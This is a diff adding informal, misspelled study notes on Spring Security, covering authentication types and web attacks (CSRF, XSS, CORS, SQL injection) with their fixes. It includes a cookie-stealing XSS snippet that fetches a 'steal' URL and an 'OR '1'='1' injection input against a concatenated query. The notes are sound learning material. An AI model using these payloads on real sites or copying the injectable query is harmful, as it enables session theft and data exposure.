@@ -1,0 +1,41 @@
+Spring securty:
+===============
+1. Authentication - Who are u?
+2. Authorization -  Waht alloed to u?
+
+Type of auhentication:
+1. Form baseed (username and password)
+2. Stateless authentication
+-> Basic
+-> JWT
+-> Auth
+
+
+
+Security attacks and soln
+=========================
+1. CSRF(Cross site request forgery)
+-> Browser manageed session to use authenticate other url.
+-> Soln by csrf token
+
+2. XSS(Cross site scripting)
+-> add mlecisus script into webpage.
+ex: <script>alert('Attack')</script>
+    <script>
+     fetch(http://localhost:8080/steal?cokkie=document.cockie);
+    </script>
+-> Used to still session
+-> Soln Escaping user input and validating data properly.
+
+3. CORS(Cross-origin Resource sharing) - Security features
+-> Diifrent origin : Protocol + doamin + port
+-> Soln by adding header (Access-Control-Allow-Origin)
+
+4. SQL Injection
+-> manupulate sql query by melecius input in user input field.
+ Ex: select * from USer where name = '"+name+"'
+    input name = 'OR '1'='1
+     select * from USer where name = '' OR '1'='1' and retur all results
+
+ -> Soln by Parametrised query.
+
